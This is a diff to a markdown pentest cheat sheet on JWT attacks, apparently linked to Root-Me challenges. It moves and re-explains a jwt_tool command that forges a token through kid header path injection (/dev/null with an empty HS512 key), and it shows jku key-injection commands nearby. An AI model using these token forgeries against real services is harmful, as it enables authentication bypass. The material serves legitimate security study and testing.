@@ -94,12 +94,6 @@ $ jwt_tool 'jwt' -T -X i     # attack 'jwk header injection'
 
 The `jku` header contains a URL or a filename used to fetch a key.
 
-* When a symmetric algorithm such as HS is used:
-
-```shell!
-$ jwt_tool "" -I -hc kid -hv "/dev/null" -S hs512 -p "" -pc claim -pv value
-```
-
 * When a asymmetric algorithm such as RS is used:
 
 ```shell!
@@ -115,7 +109,13 @@ $ jwt_tool -X s -ju "URL/jwks.json" -I -hc kid -hv jwt_tool -pc claim -pv value
 [![jwt_unsecure_key_handling](../../../../_badges/rootme/web_server/jwt_unsecure_key_handling.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
 [![jwt_public_key](../../../../_badges/rootme/web_server/jwt_public_key.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
 
-The `kid` header may be added to the header to determine which key to use when there are multiple keys. It must match the `kid` header inside the `jwt` object or a `jwt` loaded from the `jku` endpoint.
+The kid header may be present in two scenarios. The first one is to define which key file to use: `-p` must match the contents of `/dev/null`.
+
+```shell!
+$ jwt_tool "" -I -hc kid -hv "/dev/null" -S hs512 -p "" -pc claim -pv value
+```
+
+The `kid` header may be used along with `jku`. The JSON file pointed by `jku` may contain multiple keys, and `kid` determines which one to use.
 
 #### JWT Header Injection — RS256 to HS256
 
